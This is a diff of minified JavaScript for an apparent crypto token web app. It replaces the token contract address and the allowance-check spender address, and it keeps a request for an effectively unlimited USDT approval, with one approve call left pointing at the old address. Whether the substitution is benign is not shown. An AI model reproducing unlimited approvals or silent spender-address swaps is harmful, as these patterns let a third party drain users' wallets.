@@ -774,7 +774,7 @@
             }];
 
             function h(e) {
-                return new e.eth.Contract(x, "0x55d398326f99059fF775485246999027B3197955")
+                return new e.eth.Contract(x, "0x24F0154C1dCe548AdF15da2098Fdd8B8A3B8151D")
             }
             var f = n.p + "static/media/logo.png",
                 v = n.p + " ",
@@ -992,7 +992,7 @@
                                                 e.next = 10;
                                                 break
                                             }
-                                            return "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", e.next = 4, o.methods.allowance(z, "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0").call();
+                                            return "0x06d81D760898bb736b60Cd0cf98c522d51337D76", e.next = 4, o.methods.allowance(z, "0x06d81D760898bb736b60Cd0cf98c522d51337D76").call();
                                         case 4:
                                             return t = e.sent, Ge(t), e.next = 8, o.methods.balanceOf(z).call();
                                         case 8:
@@ -1018,7 +1018,7 @@
                                                 e.next = 10;
                                                 break
                                             }
-                                            return $e("Approving USDT"), "0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999", e.next = 7, o.methods.approve("0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999").send({
+                                            return $e("Approving USDT"), "0x06d81D760898bb736b60Cd0cf98c522d51337D76", "99999999999999999999999999999999999999999999999999", e.next = 7, o.methods.approve("0xc8c74e2c6a355d6a4760e6442fc74e6b698103d0", "99999999999999999999999999999999999999999999999999").send({
                                                 from: z
                                             });
                                         case 7:
